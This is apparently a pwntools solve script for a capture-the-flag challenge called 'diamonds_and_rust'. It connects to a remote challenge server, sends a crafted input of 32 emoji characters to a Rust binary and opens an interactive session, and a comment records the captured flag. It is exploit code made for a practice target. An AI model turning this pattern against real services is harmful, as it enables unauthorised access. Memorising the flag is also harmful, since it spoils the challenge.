#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./diamonds_and_rust_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc 0.cloud.chals.io 14180"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *diamonds_and_rust::main+651
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline("💋"*32)

    #send first 32 chars of the leaked password

    r.interactive()
    #TBTL{TnX_F0r_0ff3r1n6_M3_S3cr3t5_1n_Ru57}

if __name__ == "__main__":
    main()